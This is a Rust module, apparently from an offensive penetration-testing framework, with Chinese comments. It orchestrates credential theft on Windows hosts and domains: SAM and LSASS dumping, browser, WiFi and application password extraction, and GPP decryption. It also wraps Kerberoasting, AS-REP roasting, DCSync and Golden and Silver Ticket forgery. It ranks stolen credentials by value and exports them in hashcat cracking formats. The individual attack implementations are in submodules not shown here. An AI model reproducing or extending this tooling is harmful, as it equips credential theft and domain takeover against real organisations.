//! 凭据获取与攻击模块
//!
//! 根据 HTB/真实渗透报告，凭据是内网渗透中价值最高的信息（P1优先级）。
//! 本模块覆盖报告中描述的所有凭据相关攻击技术：
//!
//! - Kerberoasting: 请求TGS票据并离线破解服务账户密码
//! - AS-REP Roasting: 针对无预认证用户获取加密TGT
//! - GPP密码解密: 解密组策略首选项中存储的cpassword
//! - SAM/SYSTEM凭据提取: 从注册表导出本地账户哈希
//! - LSASS凭据dump: 从内存中提取登录凭据
//! - 浏览器密码提取: Chrome/Edge/Firefox存储的密码
//! - WiFi密码提取: netsh wlan导出的无线密码
//! - 应用凭据提取: LaZagne-like多应用凭据收集
//! - DPAPI解密: Windows数据保护API解密
//! - Golden Ticket: 使用krbtgt哈希伪造TGT
//! - Silver Ticket: 使用服务账户哈希伪造TGS
//! - DCSync: 滥用目录复制权限拉取密码哈希
//!

pub mod app_cred;
pub mod asrep_roast;
pub mod browser;
pub mod dcsync;
pub mod dpapi;
pub mod golden_ticket;
pub mod gpp;
pub mod kerberoast;
pub mod lsass;
pub mod sam;
pub mod silver_ticket;
pub mod wifi;

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

// ============================================================
// 凭据数据类型
// ============================================================

/// 凭据类型枚举
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum CredType {
    /// NTLM哈希
    NtlmHash,
    /// 明文密码
    CleartextPassword,
    /// Kerberos TGT票据
    KerberosTgt,
    /// Kerberos TGS服务票据
    KerberosTgs,
    /// Kerberos AS-REP加密响应
    KerberosAsrep,
    /// GPP加密密码
    GppPassword,
    /// 浏览器保存的密码
    BrowserPassword,
    /// WiFi密码
    WifiPassword,
    /// 应用程序凭据
    AppCredential,
    /// SSH私钥
    SshKey,
    /// DPAPI加密数据
    DpapiBlob,
    /// SAM注册表哈希
    SamHash,
    /// 令牌（Token）
    Token,
    /// 其他
    Other,
}

impl std::fmt::Display for CredType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            CredType::NtlmHash => write!(f, "NTLM哈希"),
            CredType::CleartextPassword => write!(f, "明文密码"),
            CredType::KerberosTgt => write!(f, "Kerberos TGT"),
            CredType::KerberosTgs => write!(f, "Kerberos TGS"),
            CredType::KerberosAsrep => write!(f, "Kerberos AS-REP"),
            CredType::GppPassword => write!(f, "GPP密码"),
            CredType::BrowserPassword => write!(f, "浏览器密码"),
            CredType::WifiPassword => write!(f, "WiFi密码"),
            CredType::AppCredential => write!(f, "应用凭据"),
            CredType::SshKey => write!(f, "SSH密钥"),
            CredType::DpapiBlob => write!(f, "DPAPI数据"),
            CredType::SamHash => write!(f, "SAM哈希"),
            CredType::Token => write!(f, "令牌"),
            CredType::Other => write!(f, "其他"),
        }
    }
}

/// 单个凭据条目
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    /// 凭据类型
    pub cred_type: CredType,
    /// 用户名
    pub username: Option<String>,
    /// 密码（明文）
    pub password: Option<String>,
    /// NTLM哈希
    pub ntlm_hash: Option<String>,
    /// LM哈希
    pub lm_hash: Option<String>,
    /// SHA1哈希
    pub sha1_hash: Option<String>,
    /// 域名
    pub domain: Option<String>,
    /// 目标/服务名（如SPN、URL等）
    pub target: Option<String>,
    /// 来源描述（如"LSASS内存"、"Chrome浏览器"）
    pub source: String,
    /// 主机名（凭据来源主机）
    pub hostname: Option<String>,
    /// 发现时间
    pub discovered_at: DateTime<Utc>,
    /// 附加属性
    pub attributes: HashMap<String, String>,
}

impl Credential {
    /// 创建新的凭据条目
    pub fn new(cred_type: CredType, source: &str) -> Self {
        Self {
            cred_type,
            username: None,
            password: None,
            ntlm_hash: None,
            lm_hash: None,
            sha1_hash: None,
            domain: None,
            target: None,
            source: source.to_string(),
            hostname: None,
            discovered_at: Utc::now(),
            attributes: HashMap::new(),
        }
    }

    /// 设置用户名
    pub fn with_username(mut self, username: &str) -> Self {
        self.username = Some(username.to_string());
        self
    }

    /// 设置明文密码
    pub fn with_password(mut self, password: &str) -> Self {
        self.password = Some(password.to_string());
        self
    }

    /// 设置NTLM哈希
    pub fn with_ntlm_hash(mut self, hash: &str) -> Self {
        self.ntlm_hash = Some(hash.to_string());
        self
    }

    /// 设置域名
    pub fn with_domain(mut self, domain: &str) -> Self {
        self.domain = Some(domain.to_string());
        self
    }

    /// 设置目标
    pub fn with_target(mut self, target: &str) -> Self {
        self.target = Some(target.to_string());
        self
    }

    /// 设置主机名
    pub fn with_hostname(mut self, hostname: &str) -> Self {
        self.hostname = Some(hostname.to_string());
        self
    }

    /// 添加属性
    pub fn with_attribute(mut self, key: &str, value: &str) -> Self {
        self.attributes.insert(key.to_string(), value.to_string());
        self
    }

    /// 是否为高价值凭据（域管/服务账户等）
    pub fn is_high_value(&self) -> bool {
        if let Some(ref username) = self.username {
            let u = username.to_lowercase();
            if u.contains("admin") || u.contains("krbtgt") || u.starts_with("svc_") {
                return true;
            }
        }
        if let Some(ref domain) = self.domain {
            if domain.contains("Domain Admins") || domain.contains("Enterprise Admins") {
                return true;
            }
        }
        matches!(
            self.cred_type,
            CredType::KerberosTgt | CredType::NtlmHash
        )
    }

    /// 转换为hashcat可破解格式（如果是Kerberos票据）
    pub fn to_hashcat_format(&self) -> Option<String> {
        match self.cred_type {
            CredType::KerberosTgs => {
                // $krb5tgs$23$*username$domain$spn$hash
                self.attributes.get("hashcat_tgs").as_ref().map(|attr| attr.to_string())
            }
            CredType::KerberosAsrep => {
                // $krb5asrep$23$*username$domain$hash
                self.attributes.get("hashcat_asrep").as_ref().map(|attr| attr.to_string())
            }
            CredType::NtlmHash => {
                if let (Some(ref user), Some(ref ntlm)) = (&self.username, &self.ntlm_hash) {
                    Some(format!("{}:{}:{}", user, self.lm_hash.as_deref().unwrap_or("aad3b435b51404eeaad3b435b51404ee"), ntlm))
                } else {
                    None
                }
            }
            _ => None,
        }
    }
}

// ============================================================
// 凭据收集结果
// ============================================================

/// 凭据收集汇总结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredHarvestResult {
    /// 收集开始时间
    pub start_time: DateTime<Utc>,
    /// 收集结束时间
    pub end_time: DateTime<Utc>,
    /// 耗时（秒）
    pub duration_secs: f64,
    /// 所有收集到的凭据
    pub credentials: Vec<Credential>,
    /// 按类型分类统计
    pub stats: CredHarvestStats,
    /// 目标主机名
    pub hostname: String,
}

/// 凭据收集统计
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct CredHarvestStats {
    /// 明文密码数量
    pub cleartext_passwords: usize,
    /// NTLM哈希数量
    pub ntlm_hashes: usize,
    /// Kerberos票据数量
    pub kerberos_tickets: usize,
    /// 浏览器密码数量
    pub browser_passwords: usize,
    /// WiFi密码数量
    pub wifi_passwords: usize,
    /// 应用凭据数量
    pub app_credentials: usize,
    /// GPP解密密码数量
    pub gpp_passwords: usize,
    /// 高价值凭据数量
    pub high_value: usize,
    /// 总计
    pub total: usize,
}

impl CredHarvestResult {
    pub fn new(hostname: &str) -> Self {
        Self {
            start_time: Utc::now(),
            end_time: Utc::now(),
            duration_secs: 0.0,
            credentials: Vec::new(),
            stats: CredHarvestStats::default(),
            hostname: hostname.to_string(),
        }
    }

    /// 计算统计信息
    pub fn compute_stats(&mut self) {
        self.stats = CredHarvestStats::default();
        for cred in &self.credentials {
            self.stats.total += 1;
            match cred.cred_type {
                CredType::CleartextPassword => self.stats.cleartext_passwords += 1,
                CredType::NtlmHash => self.stats.ntlm_hashes += 1,
                CredType::KerberosTgt | CredType::KerberosTgs | CredType::KerberosAsrep => {
                    self.stats.kerberos_tickets += 1
                }
                CredType::BrowserPassword => self.stats.browser_passwords += 1,
                CredType::WifiPassword => self.stats.wifi_passwords += 1,
                CredType::AppCredential => self.stats.app_credentials += 1,
                CredType::GppPassword => self.stats.gpp_passwords += 1,
                _ => {}
            }
            if cred.is_high_value() {
                self.stats.high_value += 1;
            }
        }
    }

    /// 获取高价值凭据列表
    pub fn high_value_credentials(&self) -> Vec<&Credential> {
        self.credentials.iter().filter(|c| c.is_high_value()).collect()
    }

    /// 导出为hashcat输入格式
    pub fn to_hashcat_input(&self) -> String {
        self.credentials
            .iter()
            .filter_map(|c| c.to_hashcat_format())
            .collect::<Vec<_>>()
            .join("\n")
    }
}

// ============================================================
// 凭据管理器
// ============================================================

/// 凭据管理器 —— 统一的凭据收集与攻击入口
pub struct CredManager {
    /// 目标主机名
    hostname: String,
    /// 域名
    domain: Option<String>,
    /// 域控制器地址
    domain_controller: Option<String>,
    /// 已收集的凭据
    credentials: Vec<Credential>,
}

impl CredManager {
    /// 创建凭据管理器
    pub fn new(hostname: &str) -> Self {
        Self {
            hostname: hostname.to_string(),
            domain: None,
            domain_controller: None,
            credentials: Vec::new(),
        }
    }

    /// 设置域信息
    pub fn with_domain(mut self, domain: &str, dc: Option<&str>) -> Self {
        self.domain = Some(domain.to_string());
        self.domain_controller = dc.map(|s| s.to_string());
        self
    }

    /// 运行全部凭据收集
    pub async fn harvest_all(&mut self) -> CredHarvestResult {
        let start_time = Utc::now();
        let mut result = CredHarvestResult::new(&self.hostname);

        // 1. SAM提取 (Windows)
        if let Ok(sam_creds) = sam::extract_sam_hashes() {
            result.credentials.extend(sam_creds);
        }

        // 2. LSASS凭据 (Windows, 需要高权限)
        if let Ok(lsass_creds) = lsass::extract_lsass_credentials() {
            result.credentials.extend(lsass_creds);
        }

        // 3. 浏览器密码
        if let Ok(browser_creds) = browser::extract_all_browser_passwords() {
            result.credentials.extend(browser_creds);
        }

        // 4. WiFi密码 (Windows)
        if let Ok(wifi_creds) = wifi::extract_wifi_passwords() {
            result.credentials.extend(wifi_creds);
        }

        // 5. 应用凭据
        if let Ok(app_creds) = app_cred::extract_all_app_credentials() {
            result.credentials.extend(app_creds);
        }

        // 6. GPP密码 (如果有域环境)
        if let Some(ref domain) = self.domain {
            if let Some(ref dc) = self.domain_controller {
                if let Ok(gpp_creds) = gpp::find_and_decrypt_gpp(dc, domain) {
                    result.credentials.extend(gpp_creds);
                }
            }
        }

        let end_time = Utc::now();
        result.start_time = start_time;
        result.end_time = end_time;
        result.duration_secs = (end_time - start_time).num_milliseconds() as f64 / 1000.0;
        result.compute_stats();

        self.credentials = result.credentials.clone();
        result
    }

    /// 执行 Kerberoasting 攻击
    pub async fn kerberoast(
        &self,
        dc: &str,
        domain: &str,
        username: Option<&str>,
        password: Option<&str>,
    ) -> Result<Vec<kerberoast::KerberoastTicket>, String> {
        kerberoast::kerberoast(dc, domain, username, password).await
    }

    /// 执行 AS-REP Roasting 攻击
    pub async fn asrep_roast(
        &self,
        dc: &str,
        domain: &str,
    ) -> Result<Vec<asrep_roast::AsrepTicket>, String> {
        asrep_roast::asrep_roast(dc, domain).await
    }

    /// 生成 Golden Ticket
    pub fn create_golden_ticket(
        &self,
        config: golden_ticket::GoldenTicketConfig,
    ) -> Result<golden_ticket::GoldenTicket, String> {
        golden_ticket::create_golden_ticket(&config)
    }

    /// 生成 Silver Ticket
    pub fn create_silver_ticket(
        &self,
        config: silver_ticket::SilverTicketConfig,
    ) -> Result<silver_ticket::SilverTicket, String> {
        silver_ticket::create_silver_ticket(&config)
    }

    /// 执行 DCSync 攻击
    pub async fn dcsync(
        &self,
        dc: &str,
        domain: &str,
        username: &str,
        password: Option<&str>,
        nthash: Option<&str>,
        target_user: Option<&str>,
    ) -> Result<Vec<dcsync::DcsyncResult>, String> {
        dcsync::dcsync(dc, domain, username, password, nthash, target_user).await
    }

    /// 获取已收集的凭据
    pub fn get_credentials(&self) -> &[Credential] {
        &self.credentials
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_credential_builder() {
        let cred = Credential::new(CredType::NtlmHash, "SAM注册表")
            .with_username("Administrator")
            .with_ntlm_hash("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
            .with_domain("CORP")
            .with_hostname("DC01");

        assert_eq!(cred.username.as_deref(), Some("Administrator"));
        assert!(cred.ntlm_hash.is_some());
        assert!(cred.is_high_value());
    }

    #[test]
    fn test_credential_hashcat_format_ntlm() {
        let cred = Credential::new(CredType::NtlmHash, "测试")
            .with_username("user1")
            .with_ntlm_hash("31d6cfe0d16ae931b73c59d7e0c089c0");

        let hashcat = cred.to_hashcat_format();
        assert!(hashcat.is_some());
        assert!(hashcat.unwrap().contains("user1"));
    }

    #[test]
    fn test_cred_harvest_stats() {
        let mut result = CredHarvestResult::new("TEST-PC");
        result.credentials.push(
            Credential::new(CredType::CleartextPassword, "测试")
                .with_username("admin")
                .with_password("Password123!")
        );
        result.credentials.push(
            Credential::new(CredType::NtlmHash, "测试")
                .with_username("Administrator")
                .with_ntlm_hash("abc123")
        );
        result.compute_stats();

        assert_eq!(result.stats.total, 2);
        assert_eq!(result.stats.cleartext_passwords, 1);
        assert_eq!(result.stats.ntlm_hashes, 1);
        assert_eq!(result.stats.high_value, 2);
    }

    #[test]
    fn test_cred_type_display() {
        assert_eq!(CredType::NtlmHash.to_string(), "NTLM哈希");
        assert_eq!(CredType::CleartextPassword.to_string(), "明文密码");
        assert_eq!(CredType::BrowserPassword.to_string(), "浏览器密码");
        assert_eq!(CredType::GppPassword.to_string(), "GPP密码");
    }

    #[test]
    fn test_credential_is_high_value_service_account() {
        let cred = Credential::new(CredType::CleartextPassword, "测试")
            .with_username("svc_backup");
        assert!(cred.is_high_value());
    }

    #[test]
    fn test_credential_is_high_value_krbtgt() {
        let cred = Credential::new(CredType::NtlmHash, "测试")
            .with_username("krbtgt");
        assert!(cred.is_high_value());
    }

    #[test]
    fn test_credential_not_high_value() {
        let cred = Credential::new(CredType::AppCredential, "测试")
            .with_username("johndoe");
        assert!(!cred.is_high_value());
    }
}
